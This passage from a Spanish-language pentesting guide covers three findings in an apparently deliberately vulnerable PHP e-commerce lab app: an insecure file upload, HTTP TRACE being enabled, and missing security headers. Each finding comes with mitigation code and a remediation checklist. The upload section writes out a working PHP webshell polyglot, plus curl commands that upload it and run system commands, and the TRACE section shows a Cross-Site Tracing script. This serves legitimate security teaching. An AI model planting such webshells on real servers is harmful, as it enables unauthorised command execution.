El endpoint `POST /admin/productos/guardar` permite subir archivos con validación insuficiente. Solo usa `getimagesize()` que se bypassa con headers mágicos (GIF89a, PNG, JFIF) + código PHP. Los archivos se almacenan con su extensión original en `app/public/img/uploads/` y son ejecutables vía web.

### Archivo vulnerable
- `app/controllers/Admin/ProductosController.php:149-181` — método `subirImagen()`

### Explotación desde Linux

```bash
# Crear polyglot GIF89a + PHP
cat images.jpeg > shell.php
cat >> shell.php << 'EOF'
<?php system($_GET["c"]); ?>
EOF

# Subir con cookie de admin
curl -X POST "http://192.168.x.x/perunet/admin/productos/guardar" \
  -b "perunet_session=COOKIE_ADMIN" \
  -F "nombre=test" -F "descripcion=test" \
  -F "precio=99" -F "stock=1" \
  -F "id_categoria=1" -F "id_subcategoria=1" \
  -F "id_marca=1" -F "id_modelo=1" \
  -F "imagen_file=@shell.php"

# Ejecutar webshell (ruta app/ o public/ depende del upload)
curl "http://192.168.x.x/perunet/app/public/img/uploads/shell.php?c=whoami"
```

### Mitigación
```php
// 1. Validar extensión (whitelist)
$ext = strtolower(pathinfo($nombreArchivo, PATHINFO_EXTENSION));
$allowed = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
if (!in_array($ext, $allowed)) die('Extensión no permitida');

// 2. Validar MIME real con finfo
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $nombreTemporal);
$allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
if (!in_array($mime, $allowedMimes)) die('Tipo MIME no permitido');

// 3. Renombrar archivo con nombre único
$nombreArchivo = uniqid() . '.' . $ext;

// 4. Almacenar fuera del webroot o en directorio sin ejecución
//    Agregar .htaccess en uploads/:
//    php_flag engine off
//    RemoveHandler .php .phtml .php3
```

---

## 15. HTTP TRACE habilitado (A05)

### Descripción
El servidor Apache tiene el método HTTP TRACE habilitado, permitiendo ataques de Cross-Site Tracing (XST). Combinado con XSS, un atacante puede robar cookies marcadas como HttpOnly mediante `XMLHttpRequest` con método TRACE.

### Explotación desde Linux

```bash
# Probar si TRACE está habilitado
curl -X TRACE "http://192.168.x.x/perunet/" -v 2>&1 | grep "HTTP/"

# Si responde 200 OK, el servidor es vulnerable
# Un atacante puede inyectar vía XSS:
# <script>
#   var xhr = new XMLHttpRequest();
#   xhr.open('TRACE', 'http://192.168.x.x/perunet/', true);
#   xhr.send(null);
# </script>
```

### Mitigación
```apache
# En httpd.conf o .htaccess
TraceEnable Off

# O desde .htaccess:
RewriteEngine On
RewriteCond %{REQUEST_METHOD} ^TRACE
RewriteRule .* - [F]
```

---

## 16. Headers de seguridad faltantes (A05)

### Descripción
La aplicación carece de headers de seguridad críticos: CSP (Content-Security-Policy), HSTS (Strict-Transport-Security), X-Content-Type-Options y X-Frame-Options. Esto permite clickjacking, MIME-sniffing y downgrade attacks.

### Explotación desde Linux

```bash
# Verificar headers actuales
curl -s -I "http://192.168.x.x/perunet/" | grep -iE "x-frame|x-content|strict-transport|content-security"

# La salida vacía confirma la ausencia de estos headers
```

### Mitigación
```apache
# En .htaccess (agregar al existente)
<IfModule mod_headers.c>
    # CSP - Content Security Policy
    Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdn.tailwindcss.com https://cdnjs.cloudflare.com; img-src 'self' https://ui-avatars.com data:; font-src https://cdnjs.cloudflare.com; connect-src 'self'"

    # HSTS - Strict Transport Security (solo si hay HTTPS)
    Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"

    # X-Content-Type-Options
    Header set X-Content-Type-Options "nosniff"

    # X-Frame-Options
    Header set X-Frame-Options "DENY"

    # Referrer-Policy
    Header set Referrer-Policy "strict-origin-when-cross-origin"

    # Permissions-Policy
    Header set Permissions-Policy "geolocation=(), camera=(), microphone=()"
</IfModule>
```

### Comandos rápidos para blindar la app

```bash
# 0. Restaurar prepared statements en UsuarioModel::findByEmail()
# 1. Restaurar prepared statements en ProductoModel::buscar()
# 2. Eliminar apiUsuario() y exportarUsuarios() de UsuarioController
# 3. Restaurar prepared statements en CarritoController::aplicarCupon()
# 4. Restaurar prepared statements en ContactoController::enviar()
# 5. Escapar salida con htmlspecialchars() en ContactoController
# 6. Restaurar filtro de usuario en VentaModel::getDetalleById()
# 7. Forzar id_rol=2 en AuthController::register()
# 8. Validar URL en IndexController::redirect()
# 9. Eliminar phpinfo() de IndexController
# 10. Habilitar httponly=true en App.php
# 11. Escapar salida con htmlspecialchars() en footer.php:16 y contacto.php:52
# 12. Validar extensión + MIME + renombrar en Admin/ProductosController.php
# 13. Deshabilitar TRACE en Apache (TraceEnable Off)
# 14. Agregar CSP, HSTS, X-Frame-Options, X-Content-Type-Options en .htaccess
```

---

## Checklist de Pentesting

- [ ] **A01: Broken Access Control** — IDOR en `/usuarios/compra/:id`, Mass Assignment en registro
- [ ] **A01: Open Redirect** — `/redirect?url=`
- [ ] **A03: SQL Injection** — `POST /login`, `/productos?ordenar=`, `/usuario/api/:id`, `/carrito/cupon?codigo=`, `POST /contacto`
- [ ] **A03: XSS Stored** — `POST /contacto` -> `/admin/contacto/mensajes`
- [ ] **A03: XSS Footer + Botón Contacto** — `POST /contacto` -> footer banner + onclick en botón
- [ ] **A04: Sensitive Data Exposure** — API usuario, exportación admin
- [ ] **A05: Security Misconfiguration** — `phpinfo()`, `DEBUG_MODE=true`, File Upload sin validación, HTTP TRACE, Headers faltantes
- [ ] **A07: Auth Failures** — Mass Assignment, session sin httponly
- [ ] **A08: Integrity Failures** — Inyección SQL en INSERT de contacto

---

> **Disclaimer:** Esta guía es únicamente con fines educativos y de pentesting autorizado.
> No utilizar en sistemas sin consentimiento explícito del propietario.
